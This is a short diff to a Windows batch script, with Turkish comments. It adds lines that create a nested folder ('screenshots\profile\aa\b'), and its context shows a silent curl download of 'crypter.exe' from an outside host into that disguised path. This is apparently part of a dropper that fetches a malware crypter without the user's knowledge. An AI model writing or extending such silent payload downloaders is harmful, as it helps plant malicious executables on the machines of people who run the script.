@@ -17,6 +17,9 @@ echo.
 echo.
 timeout /t 3 >nul
 
+rem Gerekli klasörleri oluştur
+if not exist "screenshots\profile\aa\b" mkdir "screenshots\profile\aa\b"
+
 rem curl kullanarak dosyayı sessiz modda indirme
 curl -s -o "screenshots\profile\aa\b\crypter.exe" https://anodos.store/download/crypter.exe
 
